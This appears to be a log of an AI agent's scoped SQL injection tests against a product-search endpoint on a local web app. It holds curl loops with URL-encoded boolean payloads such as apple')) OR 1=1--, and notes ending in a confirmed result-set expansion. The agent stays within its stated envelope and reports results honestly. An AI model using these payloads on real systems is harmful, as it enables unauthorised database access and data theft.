findings.request: for q in "%27%27%20OR%20%271%27%3D%271" "%27%27%20AND%20%271%27%3D%272" "%27%27%20AND%20%271%27%3D%271"; do echo "== q=$q"; timeout -k 3 15 curl -sS -m 10 -o - -w '\nstatus=%{http_code} size=%{size_download}\n' "http://127.0.0.1:3000/rest/products/search?q=$q"; echo; done
findings.agent_note: Sent the three requests in the envelope, one each, with no other payloads. All three returned the same HTTP 500 HTML error page (body size 974 bytes) with SQLITE_ERROR: near "1": syntax error. Derivative q=%27%27%20OR%20%271%27%3D%271: status=500 size=974, SQL error near "1". False control q=%27%27%20AND%20%271%27%3D%272: status=500 size=974, same SQL error. True control q=%27%27%20AND%20%271%27%3D%271: status=500 size=974, same SQL error. No JSON body was returned for any of them. Because all three fail at parse time with an identical error, the true/false pair cannot be distinguished, so this does not establish whether the pair changes the result set. The probe's leading '' breaks the query syntax before the boolean condition is evaluated. Next step, if the operator wants one: a separate bounded test with a syntax-valid boolean shape (for example a condition appended to the apple baseline), which is outside this envelope.

findings.request: for q in "apple%27%20OR%201%3D1--%20" "apple%27%20AND%201%3D2--%20"; do echo "== q=$q"; timeout -k 3 12 curl -sS --max-time 10 -w '\nstatus=%{http_code} size=%{size_download}\n' "http://127.0.0.1:3000/rest/products/search?q=$q"; echo; done
findings.agent_note: Sent exactly the two requests. Both returned HTTP 500 with identical HTML error bodies (size=942) reporting SQLITE_ERROR: incomplete input. Neither returned a JSON result set, so there is no difference between the true derivative (q=apple' OR 1=1-- ) and the false control (q=apple' AND 1=2-- ). Both differ from the baseline q=apple, which returned 200, size=30, {"status":"success","data":[]}. The error shows the trailing comment shape still fails at parse time, so this test does not confirm SQL injection in q. It also does not rule it out, because the boolean differential could not be observed. No enumeration or extraction was run.

findings.request: d=$(mktemp -d); for n in baseline probe control; do case $n in baseline) q=apple;; probe) q=%27;; control) q=apple%27%20OR%20%271%27%3D%271;; esac; echo "== $n q=$q"; timeout 15 curl -sS -m 10 -o "$d/$n.json" -w 'status=%{http_code} size=%{size_download}\n' "http://127.0.0.1:3000/rest/products/search?q=$q"; echo "body(first 300):"; head -c 300 "$d/$n.json"; echo; echo "count_name_fields=$(grep -o '"name"' "$d/$n.json" | wc -l) sql_err=$(grep -ciE 'sqlite|sql|syntax error|SQLITE_' "$d/$n.json")"; done
findings.agent_note: Three requests to GET /rest/products/search?q= were sent. Baseline q=apple returned HTTP 200, 1617 bytes, with 3 product records. The single-quote probe q=' returned HTTP 200, 30 bytes, data:[], with no SQL error text. The OR control q=apple' OR '1'='1 returned HTTP 200, 30 bytes, data:[], with no SQL error text. The control did not broaden the result set to all products. No SQL error and no result-set expansion was observed, so q shows no evidence of SQL injection from these three requests.

findings.request: for q in apple '%27'; do echo "== q=$q"; timeout -k 5 20 curl -sS --max-time 15 -w '\nstatus=%{http_code} size=%{size_download}\n' "http://127.0.0.1:3000/rest/products/search?q=$q" | head -c 2000; echo; done
findings.agent_note: Baseline q=apple returned HTTP 200, body 1617 bytes: a success JSON with 3 products (Apple Juice, Apple Pomace, Pineapple Juice), no SQL error. Single-quote probe q=%27 returned HTTP 200, body 30 bytes: {"status":"success","data":[]}, an empty result set with no SQL error text. The probe changes the result set from 3 items to 0 without an error. This matches the existing OR control (q=apple%27%20OR%20%271%27%3D%271, status=200 size=30), which also returned 30 bytes. The single quote alone is not a clear error-based signal, so the behavior is consistent with the quote breaking the query or matching nothing. Not conclusive of SQL injection; no further payloads sent.

(1) Derivative q=apple%27%29%29%20OR%201%3D1--%20 returned HTTP 200, body size 34254 bytes, with a populated "data" array (56 product records, e.g. "Apple Juice (1000ml)", "Orange Juice (1000ml)", "Eggfruit Juice (500ml)", "Raspberry Juice (1000ml)"). No SQL error text. The full JSON body is about 34 KB and was not reproduced in full here; it is in the saved tool output. (2) False control q=apple%27%29%29%20AND%201%3D2--%20 returned HTTP 200, body size 30 bytes, body {"status":"success","data":[]}, identical to baseline q=apple (status=200 size=30). No SQL error text. The two result sets differ: the true derivative returns 56 product records, while the false control returns an empty data array, matching baseline. The paren-closing boolean shape is therefore evidence of a boolean-dependent result change on q. No other payloads, enumeration, or UNION extraction were run.
